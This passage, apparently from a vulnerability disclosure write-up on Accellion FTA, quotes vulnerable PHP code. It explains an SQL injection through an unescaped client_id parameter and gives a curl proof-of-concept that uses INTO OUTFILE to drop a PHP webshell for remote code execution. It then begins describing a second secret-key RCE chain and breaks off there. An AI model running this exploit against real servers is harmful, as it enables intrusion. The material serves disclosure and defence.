class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;SELECT t_mail_server.* FROM t_mail_server &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_status&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;exec:mysql_query(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;) respond:&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_server_id  != \&amp;#39;999\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;!(t_mail_server.c_flag &amp;amp; &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_server_id = \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_manager = \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;t_mail_server.c_name LIKE \&amp;#39;%&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;%\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;%%&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;t_mail_server.c_user_id LIKE \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The parameters passed onto the function &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt;  will be assembled into SQL statements. Among all the functions joining the assembling, &lt;code class=&quot;highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; is the most crucial one.  &lt;br /&gt;
In the function &lt;code class=&quot;highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt;, every parameter is protected by the string &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; except for &lt;code class=&quot;highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;. Judging from the coding style of the source code, it might be a result of oversight. Therefore, SQL Injection can be triggered by sending out corresponding parameters according to the program flow.&lt;/p&gt;

&lt;p&gt;In addition, FTA database user has root privileges with FILE_PRIV option enabled. By exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; and writing their own PHP code to write-enabled directory, user will be able to execute code remotely!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api -d &lt;span class=&quot;s2&quot;&gt;&amp;quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&amp;#39; OR 1=1 LIMIT 1 INTO OUTFILE &amp;#39;/home/seos/courier/themes/templates/.cc.php&amp;#39; LINES TERMINATED BY 0x3c3f...#&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The created PHP file will be located at&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known-Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;In the previous vulnerability, one requirement to execute code remotely is the existence of a write-enabled directory for injecting webshell. But in reality, chances are there is no write-enabled directory available, thus fail to execute code through SQL Injection. But there is another way to help us accomplish RCE.&lt;/p&gt;

&lt;p&gt;The precondition of this vulnerability is &lt;strong&gt;Known-Secret-Key stored in the database&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is not a problem, since the database can be accessed with the SQL Injection vulnerability mentioned earlier. Also, although there are some parameter filters in the code, they can be bypassed!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/(.+)\(.*\)/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;delete_session_cache&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;delete_user_contact&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;valid_password&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_password_update_disallowed&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_password_format_disallowed&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get_user_contact_list&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_email_verified&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_exist_allow_direct_download&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_profile_auth&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
